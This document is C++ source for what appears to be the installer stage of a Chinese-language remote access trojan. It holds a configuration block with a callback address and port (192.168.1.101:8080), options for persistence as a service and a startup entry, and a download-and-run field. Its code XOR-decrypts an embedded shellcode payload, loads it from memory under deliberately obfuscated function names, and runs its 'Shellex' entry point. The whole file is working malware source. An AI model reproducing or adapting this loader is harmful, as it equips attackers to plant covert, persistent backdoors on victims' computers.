// Install.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <Shlobj.h>
#include "ShellCode.h"
#include "MemoryModule.h"
//配置信息结构体
struct MODIFY_DATA
{
	TCHAR szDns1[300];      //上线地址1
	TCHAR szDns2[300];      //上线地址2
	DWORD dwPort1;          //上线端口1
	DWORD dwPort2;          //上线端口2
	TCHAR szGroup[50];      //上线分组
	TCHAR szVersion[32];    //上线版本
	TCHAR SerName[100];     //服务名称
	TCHAR Serdisplay[128];  //显示名称
	TCHAR Serdesc[256];     //服务描述
	TCHAR szGetGroup[256];  //分组唯一标识
	BOOL  bLanPenetrate;    //是否使用了内网穿透
	BOOL  bService;         //是否是服务启动
	BOOL  bRuns;            //是否是启动目录启动
	BOOL  bRunOnce;         //是否为绿色安装
	TCHAR ReleasePath[100]; //安装途径
	TCHAR ReleaseName[50];  //安装名称
	WORD  Dele_zd;          //安装增大
	WORD  FileAttribute;    //文件属性
	BOOL Dele_Kzj;                //离线记录
	TCHAR szDownRun[512];   //下载运行地址
};

MODIFY_DATA modify_data = 
{
	"192.168.1.101",
	"",
	8080,
	8080,
	"",
	"",
	"",
	"",
	"",
	"",
	FALSE,			//FALSE为未使用内网穿透
	TRUE,			//TRUE为服务启动
	TRUE,			//TRUE为启动目录启动
	TRUE,			//TRUE为绿色安装，FALSE为标准安装
	"",
	"",
	0,
	FILE_ATTRIBUTE_NORMAL,
	0,
	""
};

void DecrypMain(char *Buff, int Size, char *AddTable)
{
	for (int i=0, j=0; i<Size; i++)
	{
		Buff[i] ^= AddTable[j++] % 1753 + 79;
		
		if (i % 5 == 0)
			j = 0;
	}
}

unsigned char MyFileTabLe[] = {0xBE, 0x16, 0xCF, 0x52, 0xCD};
typedef int (WINAPI *DDDDDDDDD)(MODIFY_DATA);
typedef BOOL (* MyDLL)(LPCTSTR lpData);
void AAA___JKASDANS____JOSDAS__HJGD( const char *name)
{
	
	HMEMORYMODULE hDll;
	DDDDDDDDD pfn;
	DecrypMain((char *)g_ShellCodeFileBuff, g_ShellCodeFileSize, (char *)MyFileTabLe);

	hDll=BBB__SADBGJY__DSFGHFHDKASQW(g_ShellCodeFileBuff);

	if (hDll==NULL)
	return ;
	pfn=(DDDDDDDDD)TTTTT_PPPPP_XSDSF45345(hDll,name);
		if (pfn==NULL)
		{	
			bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
			return;
		}
		pfn(modify_data);
		if (hDll!=NULL)
		{

		bbssss_gwegd4524_lfgdsdfsfhg_aaaaaa(hDll);
        hDll=NULL;		
		}
		ExitProcess(0);

		
	
}

int APIENTRY WinMain(HINSTANCE hInstance,
					 HINSTANCE hPrevInstance,
					 LPSTR lpCmdLine, 
					 int nCmdShow)
{	
	char shellex[]={'S','h','e','l','l','e','x','\0'};	
	AAA___JKASDANS____JOSDAS__HJGD(shellex);
    return 0;
}

	

